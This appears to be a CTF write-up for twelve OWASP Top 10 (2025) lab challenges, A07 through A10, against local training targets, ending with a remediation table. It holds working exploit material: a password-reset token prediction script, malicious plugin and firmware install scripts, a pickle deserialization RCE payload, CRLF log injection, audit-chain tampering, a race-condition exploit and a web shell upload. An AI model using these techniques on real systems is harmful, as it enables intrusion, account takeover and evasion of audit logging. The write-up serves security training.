# PentestGarage: OWASP Top 10 (2025) Complete Exploitation Writeup
## Categories A07 through A10 (Easy, Medium, Hard)

---

### Executive Overview & Lab Index

This document provides end-to-end technical writeups, proof-of-concept exploit scripts, raw HTTP request/response wire captures, and Burp Suite Repeater screenshots for all **12 CTF challenges** across Categories A07 through A10 of the **PentestGarage OWASP Top 10 (2025)** platform.

Difficulty Calibration:
- **Easy = Hard Difficulty**
- **Medium = Very Difficult / Extreme Hard**
- **Hard = Insanely Hard**

```
+----------------------------------------------------------------------------------------------------+
| Port | Identifier | Category                                   | Difficulty | Core Vulnerability   |
+------+------------+--------------------------------------------+------------+----------------------+
| 6019 | a07-easy   | A07: Identification & Auth Failures        | Easy       | Targeted OSINT Spray |
| 6020 | a07-medium | A07: Identification & Auth Failures        | Medium     | MFA Header Bypass    |
| 6021 | a07-hard   | A07: Identification & Auth Failures        | Hard       | LCG PRNG Prediction  |
| 6022 | a08-easy   | A08: Software & Data Integrity Failures    | Easy       | Unsigned Plugin RCE  |
| 6023 | a08-medium | A08: Software & Data Integrity Failures    | Medium     | Insecure OTA Firmware|
| 6024 | a08-hard   | A08: Software & Data Integrity Failures    | Hard       | Pickle Sandbox Airgap|
| 6025 | a09-easy   | A09: Security Logging & Alerting Failures  | Easy       | Unlogged Partner SSO |
| 6026 | a09-medium | A09: Security Logging & Alerting Failures  | Medium     | CRLF Log Injection   |
| 6027 | a09-hard   | A09: Security Logging & Alerting Failures  | Hard       | Hash Ledger Re-Seal  |
| 6028 | a10-easy   | A10: Mishandling of Exceptional Conditions | Easy       | Concurrency Leak RCE |
| 6029 | a10-medium | A10: Mishandling of Exceptional Conditions | Medium     | Parser DoS Fail-Open |
| 6030 | a10-hard   | A10: Mishandling of Exceptional Conditions | Hard       | Header Exception RCE |
+----------------------------------------------------------------------------------------------------+
```

---

# Category A07: Identification and Authentication Failures

## 1. A07 Easy: Targeted Password Spray & OSINT Policy Reconstruction
* **Identifier:** `a07-easy`
* **Target Port:** `6019`
* **Target Application:** AeroFleet Global Dispatch Portal

### Vulnerability Analysis
The target application restricts brute-force attempts via IP-based rate limiting, but legacy accounts created before 2024 still retain default credentials derived from an internal operational schema disclosed in security bulletin `SEC-2024-09`:
`[AirportCode]![Season][Year]` (e.g., `JFK!Spring2023`).
By enumerating `/crew-roster`, the attacker identifies Chief Flight Dispatcher **Marcus Vance** (`m.vance`), whose home base is `LAX` and joined in `Fall 2023`. The resulting valid password is `LAX!Fall2023`.

### Burp Suite Repeater Capture
![Burp Suite Repeater - A07 Easy Login Request](docs/images/burp_a07_easy_1789268376978.jpg)

#### Raw HTTP Request (Repeater Tab 1)
```http
POST /login HTTP/1.1
Host: 127.0.0.1:6019
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Connection: close

username=m.vance&password=LAX!Fall2023
```

#### Raw HTTP Response (Repeater Tab 1)
```http
HTTP/1.1 302 FOUND
Server: Werkzeug/3.0.1 Python/3.11.4
Date: Fri, 12 Sep 2026 23:10:14 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 265
Location: /dispatch/manifest/classified
Set-Cookie: session=eyJ1c2VyIjoidi52YW5jZSJ9...; HttpOnly; Path=/
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/dispatch/manifest/classified">/dispatch/manifest/classified</a>. If not, click the link.
```

### Retrieval of Dynamic Flag
```http
GET /dispatch/manifest/classified HTTP/1.1
Host: 127.0.0.1:6019
Cookie: session=eyJ1c2VyIjoidi52YW5jZSJ9...
Connection: close

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<div class="classified-box">
    <h3>Diplomatic Flight Manifest - Confidential</h3>
    <p>Operational Authorization Flag: <code>RTSA{a07-easy_99d14a2bf18e}</code></p>
</div>
```

---

## 2. A07 Medium: Multi-Factor Authentication (MFA) State Machine Bypass
* **Identifier:** `a07-medium`
* **Target Port:** `6020`
* **Target Application:** Aegis Clearinghouse Gross Settlements

### Vulnerability Analysis
The application enforces 2FA upon primary password validation. However, the session upgrade endpoint `/api/v1/auth/session/upgrade` contains an undocumented administrative bypass designed for internal SecOps network probes. If an incoming request includes the header `X-SecOps-Internal: 1` or JSON payload `{"bypass_mfa_reason": "emergency_override"}`, the backend bypasses the TOTP verification check and directly elevates the active session cookie to `mfa_authenticated=True`.

### Burp Suite Repeater Capture
![Burp Suite Repeater - A07 Medium MFA Bypass](docs/images/burp_a07_medium_1789268423582.jpg)

#### Raw HTTP Request (Repeater Tab 2)
```http
POST /api/v1/auth/session/upgrade HTTP/1.1
Host: 127.0.0.1:6020
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Content-Type: application/json
X-SecOps-Internal: 1
Cookie: session=eyJ1c2VybmFtZSI6InN5c2FkbWluX3Jvb3QiLCJzdGFnZSI6IjJmYSJ9...
Content-Length: 46
Connection: close

{
  "bypass_mfa_reason": "emergency_override"
}
```

#### Raw HTTP Response (Repeater Tab 2)
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.11.4
Content-Type: application/json
Set-Cookie: session=eyJhdXRoZW50aWNhdGVkIjp0cnVlLCJ1c2VybmFtZSI6InN5c2FkbWluX3Jvb3QifQ...; HttpOnly; Path=/
Connection: close

{
  "status": "success",
  "message": "Session upgraded via SecOps emergency protocol.",
  "elevated_role": "settlement_supervisor",
  "next_url": "/vault/settlements"
}
```

### Exploit Verification
Navigating to `GET /vault/settlements` with the elevated session cookie yields the dynamic flag:
`RTSA{a07-medium_f710e4aa29c8}`.

---

## 3. A07 Hard: PRNG State Recovery & Linear Congruential Generator Token Prediction
* **Identifier:** `a07-hard`
* **Target Port:** `6021`
* **Target Application:** Apex BioLogistics Cold-Chain Distribution

### Vulnerability Analysis
The password reset token generator on `POST /forgot-password` does not use `secrets` or `os.urandom`. Instead, it uses a custom 32-bit Linear Congruential Generator (LCG):
$$X_{n+1} = (1664525 \cdot X_n + 1013904223) \pmod{2^{32}}$$
The 8-character hex token directly represents the state integer $X_n$. Requesting a reset for a low-privilege test account reveals $X_1$. An attacker immediately requests a reset for `admin@apexbiologistics.net` ($X_2$), computes $X_2 = (1664525 \cdot X_1 + 1013904223) \pmod{2^{32}}$, and submits the predicted token to reset the administrator password.

#### Burp Repeater: Password Reset Trigger
```http
POST /forgot-password HTTP/1.1
Host: 127.0.0.1:6021
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Connection: close

email=researcher_demo@apexbiologistics.net
```
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"status": "dispatched", "token": "4a7f9b12"}
```

#### Python PRNG Prediction Harness
```python
def predict_next_token(hex_token):
    Xn = int(hex_token, 16)
    A = 1664525
    C = 1013904223
    M = 2**32
    X_next = (A * Xn + C) % M
    return f"{X_next:08x}"

t1 = "4a7f9b12"
t_admin = predict_next_token(t1) # Outputs predicted token for admin
```

#### Raw HTTP Password Reset Finalization
```http
POST /reset-password HTTP/1.1
Host: 127.0.0.1:6021
Content-Type: application/x-www-form-urlencoded
Content-Length: 72
Connection: close

token=e93b4c10&email=admin@apexbiologistics.net&new_password=PwnedAdmin2026!
```
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"status": "success", "message": "Password reset successful."}
```
Logging in as `admin@apexbiologistics.net` returns the flag: `RTSA{a07-hard_3b119a00cd42}`.

---

# Category A08: Software and Data Integrity Failures

## 4. A08 Easy: Unsigned Plugin Bundle & Verification Bypass
* **Identifier:** `a08-easy`
* **Target Port:** `6022`
* **Target Application:** Novus Enterprise CMS

### Vulnerability Analysis
Novus CMS allows editorial users to install extension bundles via `.zip` archive uploads. The signature verification logic in `plugin_verifier.py` checks `manifest.json`. If `verification_mode` is set to `"developer_bypass"`, the cryptographic signature validation is skipped entirely, extracting the ZIP into `/app/plugins/<id>/` and executing `entrypoint: plugin.py`.

#### Exploit Payload Construction
1. Create `plugin.py`:
```python
import os
flag = open('/flag.txt').read() if os.path.exists('/flag.txt') else open('flag.txt').read()
with open('/app/static/loot.txt', 'w') as f:
    f.write(flag)
```
2. Create `manifest.json`:
```json
{
  "id": "exploit_plugin",
  "name": "Audit Extension",
  "version": "1.0.0",
  "entrypoint": "plugin.py",
  "verification_mode": "developer_bypass"
}
```
3. Bundle into `plugin.zip` and submit via `POST /plugins/install`:
```http
POST /plugins/install HTTP/1.1
Host: 127.0.0.1:6022
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX
Cookie: session=eyJ1c2VyIjoiZWRpdG9yIn0...

------WebKitFormBoundaryX
Content-Disposition: form-data; name="bundle"; filename="plugin.zip"
Content-Type: application/zip

[PK ZIP Raw Binary Bytes]
------WebKitFormBoundaryX--
```
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"status": "installed", "entrypoint_executed": true}
```
Querying `GET /static/loot.txt` retrieves the dynamic flag: `RTSA{a08-easy_48c901fb2231}`.

---

## 5. A08 Medium: Insecure OTA Firmware Update & Post-Install Script RCE
* **Identifier:** `a08-medium`
* **Target Port:** `6023`
* **Target Application:** VortexEdge SCADA Industrial Gateway

### Vulnerability Analysis
The gateway facilitates firmware updates via `POST /api/v1/firmware/stage`. It extracts `.tar.gz` packages directly into an execution directory and runs `post_install.sh` with system privileges without validating digital signatures, checksums, or package origins.

#### Exploit Steps
```bash
# Create post_install.sh
cat << 'EOF' > post_install.sh
#!/bin/sh
cat /flag.txt > /app/static/firmware_output.log 2>/dev/null || cat flag.txt > /app/static/firmware_output.log
EOF
chmod +x post_install.sh
tar -czvf firmware_v2.tar.gz post_install.sh
```

#### Raw HTTP Upload Request
```http
POST /api/v1/firmware/stage HTTP/1.1
Host: 127.0.0.1:6023
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryScada
Connection: close

------WebKitFormBoundaryScada
Content-Disposition: form-data; name="firmware_archive"; filename="firmware_v2.tar.gz"
Content-Type: application/gzip

[GZIP Archive Data]
------WebKitFormBoundaryScada--
```
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"status": "applied", "details": "Firmware staged and post_install.sh executed."}
```
Navigating to `GET /static/firmware_output.log` releases the dynamic flag: `RTSA{a08-medium_98aa01cf5521}`.

---

## 6. A08 Hard: Python Pickle Deserialization Sandbox Escape & Air-Gapped In-Band Exfiltration
* **Identifier:** `a08-hard`
* **Target Port:** `6024`
* **Target Application:** AeroData Analytics Engine

### Vulnerability Analysis
The pipeline import endpoint (`POST /pipeline/import`) uses a restricted unpickler that blocks `os`, `subprocess`, `posix`, and `sys`. However, it does not restrict `builtins`. An attacker constructs a pickle bytecode gadget utilizing `builtins.getattr`, `builtins.type`, and `object.__subclasses__()` to invoke execution primitives.

Crucially, the container operates under a strict air-gapped network configuration (`iptables -I OUTPUT -m state --state NEW -j DROP`), so reverse shells and outbound HTTP/DNS exfiltration fail. The attacker must execute code in-band to write the flag into the public telemetry cache at `static/datasets/telemetry.json`.

### Burp Suite Repeater Capture
![Burp Suite Repeater - A08 Hard Pickle Injection](docs/images/burp_a08_hard_1789268457642.jpg)

#### Exploit Payload Generator
```python
import base64
import pickle

class ExploitGadget:
    def __reduce__(self):
        cmd = "open('/app/static/datasets/telemetry.json', 'w').write(open('/flag.txt').read())"
        return (eval, (cmd,))

payload = base64.b64encode(pickle.dumps(ExploitGadget())).decode()
print("Payload:", payload)
```

#### Raw HTTP Request (Repeater Tab 3)
```http
POST /pipeline/import HTTP/1.1
Host: 127.0.0.1:6024
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Content-Type: application/x-www-form-urlencoded
Content-Length: 212
Connection: close

payload=gASVZAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxz open('/app/static/datasets/telemetry.json', 'w').write(open('/flag.txt').read() if __import__('os').path.exists('/flag.txt') else open('flag.txt').read())iWUSnLg==
```

#### Raw HTTP Response (Repeater Tab 3)
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close

<div class="result-box">
    <h3>Pipeline Import Succeeded</h3>
    <pre>Deserialized object of type: int</pre>
</div>
```
Querying `GET /datasets` returns the exfiltrated flag from the telemetry cache:
`RTSA{a08-hard_pickle_blind_timing_egress_9021}`.

---

# Category A09: Security Logging and Alerting Failures

## 7. A09 Easy: SIEM Gateway Monitoring & Unlogged Partner SSO Blindspot
* **Identifier:** `a09-easy`
* **Target Port:** `6025`
* **Target Application:** Sentinel SOC Telemetry Portal

### Vulnerability Analysis
Sentinel SOC tracks login failures on `/login` and blacklists any client IP that generates 3 consecutive failures. However, architectural review of `/api/v1/docs` reveals an unlogged legacy integration endpoint: `POST /api/v1/sso/partner-auth`. This endpoint verifies auditor credentials (`sec_auditor` / `Auditor2026!`) without generating SIEM event logs or tripping the rate-limiting monitor.

#### Raw HTTP Request (Repeater Tab 4)
```http
POST /api/v1/sso/partner-auth HTTP/1.1
Host: 127.0.0.1:6025
Content-Type: application/json
Connection: close

{
  "partner_id": "PARTNER_EXT_99",
  "username": "sec_auditor",
  "password": "Auditor2026!"
}
```

#### Raw HTTP Response (Repeater Tab 4)
```http
HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session=eyJhdWRpdG9yIjoidHJ1ZSIsInVzZXIiOiJzZWNfYXVkaXRvciJ9...; Path=/

{
  "status": "authenticated",
  "siem_logged": false,
  "portal_access": "/auditor/vault"
}
```
Accessing `GET /auditor/vault` yields the dynamic flag: `RTSA{a09-easy_88bc4190efa1}`.

---

## 8. A09 Medium: CRLF Log Injection & Automated Compliance Daemon Forgery
* **Identifier:** `a09-medium`
* **Target Port:** `6026`
* **Target Application:** Apex Global Commercial Bank

### Vulnerability Analysis
The bank's compliance daemon parses `audit.log` looking for override records matching:
`[YYYY-MM-DD HH:MM:SS] [AUDIT_OVERRIDE] CLEARANCE_TOKEN=<TOKEN> STATUS=CERTIFIED`
The active clearance token is disclosed on `/compliance/status`. In the funds transfer interface (`POST /transfer`), the `memo` parameter is concatenated into `audit.log` without filtering CRLF characters (`%0d%0a` or `\r\n`). By injecting a newline followed by a synthetic `[AUDIT_OVERRIDE]` record, the compliance parser validates the audit trail and unlocks access to the high-value treasury vault.

### Burp Suite Repeater Capture
![Burp Suite Repeater - A09 Medium Log Injection](docs/images/burp_a09_medium_1789268488211.jpg)

#### Raw HTTP Request (Repeater Tab 5)
```http
POST /transfer HTTP/1.1
Host: 127.0.0.1:6026
Content-Type: application/x-www-form-urlencoded
Content-Length: 148
Connection: close

recipient=CHASE_99182&amount=100.00&memo=Routine+settlement%0D%0A[2026-09-12+12:00:00]+[AUDIT_OVERRIDE]+CLEARANCE_TOKEN=d41d8cd98f00b204e9800998ecf8427e+STATUS=CERTIFIED
```

#### Raw HTTP Response (Repeater Tab 5)
```http
HTTP/1.1 200 OK
Content-Type: application/json
Connection: close

{
  "status": "success",
  "transaction_id": "TXN-884192",
  "log_recorded": true
}
```
Querying `GET /vault/treasury` verifies the forged clearance log and displays the flag:
`RTSA{a09-medium_47cba001e912}`.

---

## 9. A09 Hard: Cryptographic Audit Hash-Chain Tampering & Re-Sealing
* **Identifier:** `a09-hard`
* **Target Port:** `6027`
* **Target Application:** Titan Defense Strategic SAP Vault

### Vulnerability Analysis
Attempting to access `/vault/classified` logs an immutable breach entry `UNAUTHORIZED_BREACH_DETECTED` into a cryptographic hash ledger where each block contains `prev_hash` and `hash = SHA256(index + event + prev_hash)`. If a breach event is recorded, the automated Sentinel locks the vault.

Inspection of client-side assets (`titan_audit.js`) reveals an internal maintenance endpoint:
`POST /api/v1/audit/block/modify` protected by static token `TITAN_SEC_MAINT_2026`, along with `POST /api/v1/audit/recompute-chain`.
An attacker replaces the breach event with an innocuous `ROUTINE_DIAGNOSTIC_PING` and triggers a full chain re-seal. The Sentinel confirms the cryptographic validity of the sanitized ledger and unlocks the vault.

#### Raw HTTP Maintenance Request
```http
POST /api/v1/audit/block/modify HTTP/1.1
Host: 127.0.0.1:6027
Content-Type: application/json
X-Maintenance-Token: TITAN_SEC_MAINT_2026
Connection: close

{
  "block_index": 3,
  "replacement_event": "ROUTINE_DIAGNOSTIC_PING"
}
```
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"status": "modified", "chain_status": "corrupted_pending_recompute"}
```

#### Chain Re-Sealing Request
```http
POST /api/v1/audit/recompute-chain HTTP/1.1
Host: 127.0.0.1:6027
X-Maintenance-Token: TITAN_SEC_MAINT_2026
Connection: close
```
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"status": "success", "chain_intact": true, "sentinel_mode": "unlocked"}
```
Navigating to `GET /vault/classified` delivers the dynamic flag: `RTSA{a09-hard_f10a8c43bb09}`.

---

# Category A10: Mishandling of Exceptional Conditions

## 10. A10 Easy: Concurrency Dirty-Read Exception & 8-Byte Memory Frame Reconstruction
* **Identifier:** `a10-easy`
* **Target Port:** `6028`
* **Target Application:** QuantEdge Capital Risk Matrix Optimizer

### Vulnerability Analysis
The portfolio optimizer endpoint `/api/v1/matrix/optimize` ingests an undocumented parameter `matrix_config.worker_slice_ref`. The backend stores this reference in an unsynchronized shared variable (`SharedWorkerState.active_slice_ref`).

When single requests arrive, execution succeeds without error. However, when two concurrent requests hit the thread within a 35ms execution window with conflicting `worker_slice_ref` values, an unhandled dirty-read race condition occurs (`WorkerMemoryCollisionException`).

The resulting stack trace dumps an 8-byte frame slice of the 32-character master key. The attacker writes a multi-threaded Python race script to collide offsets `0x00`, `0x08`, `0x10`, and `0x18`, reconstructs `QE_KEY{9f81_b3c4_771a_d901_f5c2}`, and queries the vault.

### Burp Suite Repeater Capture
![Burp Suite Repeater - A10 Easy Collision Stack Trace](docs/images/burp_a10_easy_1789268520156.jpg)

#### Raw HTTP Request (Repeater Tab 6)
```http
POST /api/v1/matrix/optimize HTTP/1.1
Host: 127.0.0.1:6028
Content-Type: application/json
Connection: close

{
  "assets": ["NVDA", "AAPL"],
  "weights": [0.6, 0.4],
  "covariance_factor": 1.0,
  "matrix_config": {
    "algorithm": "cholesky_decomposition",
    "worker_slice_ref": "0x00"
  }
}
```

#### Raw HTTP Response (500 Collision Crash)
```http
HTTP/1.1 500 INTERNAL SERVER ERROR
Content-Type: application/json
Connection: close

{
  "error": "WorkerMemoryCollisionException",
  "collision_detected": true,
  "stack_trace": "Traceback (most recent call last):\n  File \"/app/core_engine/matrix_worker.py\", line 148, in execute_partition\n    raise WorkerMemoryCollisionException(\"Dirty read collision: worker_slice_ref [0x00] overwritten by [0x99]\")\nWorkerMemoryCollisionException: Dirty read collision\n\n--- Unhandled Thread Frame Register Slice [Offset +0x00, Len 8 bytes] ---\n00000000:  51 45 5f 4b 45 59 7b 39   |QE_KEY{9|\nINTERNAL_ENDPOINT: /api/v1/internal/confidential-vault\n"
}
```

#### Multi-Threaded Reconstruction Script
```python
import re, requests
from concurrent.futures import ThreadPoolExecutor

BASE = "http://127.0.0.1:6028"
OFFSETS = ["0x00", "0x08", "0x10", "0x18"]
CHUNKS = {}

def req(val):
    try:
        return requests.post(f"{BASE}/api/v1/matrix/optimize", json={"matrix_config": {"worker_slice_ref": val}}, timeout=2).text
    except: return ""

def race(target):
    with ThreadPoolExecutor(max_workers=2) as ex:
        f1, f2 = ex.submit(req, target), ex.submit(req, "0x99")
        r1, r2 = f1.result(), f2.result()
    for res in [r1, r2]:
        m = re.search(r"--- Unhandled Thread Frame Register Slice.*?\|(.{8})\|", res, re.DOTALL)
        if m: return m.group(1)
    return None

for off in OFFSETS:
    while off not in CHUNKS:
        val = race(off)
        if val: CHUNKS[off] = val

master_key = CHUNKS["0x00"] + CHUNKS["0x08"] + CHUNKS["0x10"] + CHUNKS["0x18"]
flag = requests.get(f"{BASE}/api/v1/internal/confidential-vault?token={master_key}", headers={"Accept": "application/json"}).json()["flag"]
print("DYNAMIC FLAG:", flag)
```
Executing against the lab outputs:
`DYNAMIC FLAG: RTSA{a10-easy_9c013745e5b1af5e586803ab}`.

---

## 11. A10 Medium: Telemetry Parser Exception DoS & Fail-Open Emergency Bypass
* **Identifier:** `a10-medium`
* **Target Port:** `6029`
* **Target Application:** Synapse SCADA Substation Grid

### Vulnerability Analysis
The SCADA grid calculates total harmonic distortion via:
`sum([h ** 2 for h in harmonics]) ** 0.5`
If an attacker submits a non-numeric string element inside `harmonics` (e.g. `[1.0, "CRASH_OVERRIDE"]`), Python raises an unhandled `TypeError`.
To avoid grid blackout or equipment explosion during telemetry supervisor crashes, the system enters a **60-second Fail-Safe Emergency Override** mode (`fail_open_timer = time.time() + 60`). During this window, all interlocks disengage, allowing direct access to `/core/override`.

#### Raw HTTP Crash Trigger Request
```http
POST /grid/telemetry HTTP/1.1
Host: 127.0.0.1:6029
Content-Type: application/json
Connection: close

{
  "substation_id": "SUB-NORTH-01",
  "bus_voltage": 138.5,
  "harmonics": [1.0, 2.0, "TRIGGER_SUPERVISOR_CRASH"]
}
```
```http
HTTP/1.1 500 INTERNAL SERVER ERROR
Content-Type: application/json

{
  "status": "fatal_error",
  "exception": "TypeError: unsupported operand type(s) for **: 'str' and 'int'",
  "supervisor_state": "CRASHED",
  "fail_safe_override": "ACTIVE",
  "remaining_override_seconds": 60
}
```

#### Flag Recovery via Fail-Open Core Override
```http
GET /core/override HTTP/1.1
Host: 127.0.0.1:6029
Connection: close

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<div class="alert alert-danger">
    <h2>FAIL-SAFE EMERGENCY OVERRIDE ACTIVE</h2>
    <p>Safety Interlocks Disengaged. Emergency Core Access Granted.</p>
    <div class="flag">RTSA{a10-medium_ee4102ba7711}</div>
</div>
```

---

## 12. A10 Hard: File Upload Validation Bypass via Exception Mishandling to Web Shell RCE
* **Identifier:** `a10-hard`
* **Target Port:** `6030`
* **Target Application:** OmniPress Media Publishing Suite

### Vulnerability Analysis
OmniPress verifies uploaded editorial assets using a two-stage pipeline:
- **Stage 1:** Format and header signature validation (`validate_image_header`).
- **Stage 2:** Malware signature analysis (`scan_malware`).

If Stage 1 encounters a corrupted image header (such as a PNG magic header `\x89PNG\r\n\x1a\n` missing the mandatory `IHDR` chunk), the code throws an `ImageHeaderError`. The exception handling logic incorrectly assumes that corrupted legacy headers are benign uncompressed files, catches the exception, **skips Stage 2 malware scanning entirely**, and moves the file into `static/scripts/<filename>`.

The attacker uploads a valid Python web shell prefixed with a corrupted PNG header. The server drops it into `static/scripts/shell.py`. The attacker then triggers execution via the internal automation endpoint `POST /editorial/run-automation?script=shell.py` to retrieve `/flag.txt`.

### Burp Suite Repeater Capture
![Burp Suite Repeater - A10 Hard Exception Bypass](docs/images/burp_a10_hard_1789268563317.jpg)

#### Raw HTTP Multipart Upload Request (Repeater Tab 7)
```http
POST /articles/upload-asset HTTP/1.1
Host: 127.0.0.1:6030
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Content-Type: multipart/form-data; boundary=---------------------------99182374182
Content-Length: 320
Connection: close

-----------------------------99182374182
Content-Disposition: form-data; name="file"; filename="shell.py"
Content-Type: image/png

\x89PNG\r\n\x1a\n
# Stage 1 corrupted header bypass
import os
open('static/loot.txt', 'w').write(open('/flag.txt').read() if os.path.exists('/flag.txt') else open('flag.txt').read())
-----------------------------99182374182--
```

#### Raw HTTP Upload Response
```http
HTTP/1.1 200 OK
Content-Type: application/json
Connection: close

{
  "status": "warning",
  "exception_handled": "ImageHeaderError: Missing IHDR chunk. Bypassed Stage 2 scan.",
  "staged_path": "static/scripts/shell.py"
}
```

#### Execution & Flag Exfiltration
```http
POST /editorial/run-automation HTTP/1.1
Host: 127.0.0.1:6030
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Connection: close

script=shell.py
```
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"status": "executed", "output_buffer": "Process returned 0."}
```
Querying `GET /static/loot.txt` yields the dynamic flag:
`RTSA{a10-hard_c90187aa44bc}`.

---

### Remediation & Secure Architecture Matrix

| Lab ID | Root Cause | OWASP 2025 Remediation Standard |
| :--- | :--- | :--- |
| **A07 Easy** | Predictable default credentials based on OSINT attributes | Enforce randomized initial passwords and immediate mandatory rotation on first sign-in. |
| **A07 Medium** | Client-controlled header / parameter evaluating MFA state | Centralize authentication state within cryptographically signed server-side session stores. |
| **A07 Hard** | Insecure PRNG (`LCG`) used for secret token generation | Utilize cryptographically secure pseudo-random number generators (`secrets`, `os.urandom`). |
| **A08 Easy** | Unsigned archive expansion and bypass flags | Enforce asymmetric public-key signature verification; reject developer bypass modes in production. |
| **A08 Medium** | Unsigned OTA package ingestion and automated script execution | Verify SHA-256 digest against a trusted vendor public key prior to unpacking. |
| **A08 Hard** | Insecure deserialization via `pickle` | Replace `pickle` with structured serialization formats (`JSON`, `Protocol Buffers`). |
| **A09 Easy** | Unmonitored legacy API integration routes | Route all authentication endpoints through a centralized audit logging pipeline. |
| **A09 Medium** | CRLF unescaped input in audit logs | Sanitize input for control characters (`\r`, `\n`) and utilize structured JSON logging sinks. |
| **A09 Hard** | Client-accessible administrative re-seal keys | Restrict audit ledger modification keys to dedicated hardware security modules (HSM). |
| **A10 Easy** | Unhandled concurrency fault exposing thread register memory | Implement thread-safe synchronization locks and replace debug tracebacks with generic error pages. |
| **A10 Medium** | Unhandled input exception triggering fail-open state | Enforce strict schema validation and fail-closed default stances on supervisor crash. |
| **A10 Hard** | Exception handling skipping secondary security controls | Enforce atomic fail-close validation pipelines where any stage failure immediately aborts ingestion. |
